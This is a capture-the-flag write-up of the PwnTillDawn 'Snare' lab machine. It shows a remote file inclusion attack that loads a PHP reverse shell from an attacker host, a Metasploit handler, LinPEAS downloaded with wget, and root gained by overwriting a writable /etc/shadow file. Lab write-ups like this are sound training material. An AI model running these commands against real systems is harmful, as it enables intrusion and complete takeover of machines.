PwnTillDawn - Snare Machine Writeup

This writeup details the steps I took to exploit and escalate privileges on the Snare machine.

Key Takeaways

  1. Review web application configurations to exploit parameter manipulation vulnerabilities like RFI.
  2. Check sensitive files such as /etc/shadow for their permissions.
  3. Use automated tools like LinPEAS to quickly identify misconfigurations and exploit.

Step 2: Exploiting Remote File Inclusion (RFI)

I tested for Remote File Inclusion (RFI) and successfully executed a reverse shell by hosting a malicious PHP file on my local server:

Preparing the Exploit

  1. Modified a PHP reverse shell from Pentest Monkey to include my attacker's IP (10.66.66.134) and port (8000).

  2. Hosted the exploit file using a Python HTTP server:

     python -m http.server

  3. Triggered the RFI vulnerability:

     curl 'http://10.150.150.18/index.php?page=http://10.66.66.134:8000/exploit'

  4. Set up a Metasploit multi-handler to catch the shell:

     [msf](Jobs:0 Agents:1) >> use exploit/multi/handler
                                [msf](Jobs:0 Agents:1) exploit(multi/handler) >> set LHOST 10.66.66.134
                                [msf](Jobs:0 Agents:1) exploit(multi/handler) >> run
                                
                                    
[msf](Jobs:0 Agents:1) >> search multi/handler

Step 3: Privilege Escalation

To escalate privileges, I used LinPEAS to enumerate potential vulnerabilities:

Hosting LinPEAS

  1. Hosted the script using Python HTTP server:

     python -m http.server

  2. Downloaded the script on the target machine:

     wget http://10.66.66.134:8000/linpeas.sh
                                chmod +x linpeas.sh
                                ./linpeas.sh

Exploiting Writable Shadow File

  1. Generated a new password hash for the root user:

     mkpasswd -m sha-512 elliothacks

  2. Created a modified /etc/shadow file locally with the new root hash.

  3. Uploaded and overwrote the shadow file on the target machine:

     wget http://10.66.66.134:8000/elly.txt
                                cat elly.txt > /etc/shadow

  4. Gained root access:

     su root
